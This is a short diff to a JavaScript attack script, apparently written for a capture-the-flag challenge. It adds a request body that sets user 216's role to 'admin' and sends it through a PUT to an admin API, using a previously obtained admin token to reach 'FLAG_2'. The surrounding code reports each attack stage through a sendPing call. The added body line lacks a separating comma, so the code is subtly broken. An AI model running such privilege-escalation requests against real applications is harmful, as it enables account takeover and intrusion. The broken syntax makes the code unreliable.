@@ -70,6 +70,11 @@
                         user_name: data.user ? data.user.name : "N/A"
                     });
 
+                    const formData = {
+                        name: "NGOCCCCCCCCCCCCNGOCCCCCCCCCCCC",
+                        email: "ngocn1@gmail.com",
+                        role: "admin",
+                    };
                     // Bước 2: Dùng API Token để lấy FLAG_2
                     return fetch("/api/admin/users/216", {
                             method: "PUT",
@@ -78,6 +83,7 @@
                                 "Authorization": "Bearer " + adminApiToken, // QUAN TRỌNG!
                                 "X-Requested-With": "XMLHttpRequest"
                             }
+                            body: JSON.stringify(formData)
                         });
                 } else {
                     sendPing({ stage: "gen_token_SUCCESS_but_no_token_field", received_data: JSON.stringify(data) });
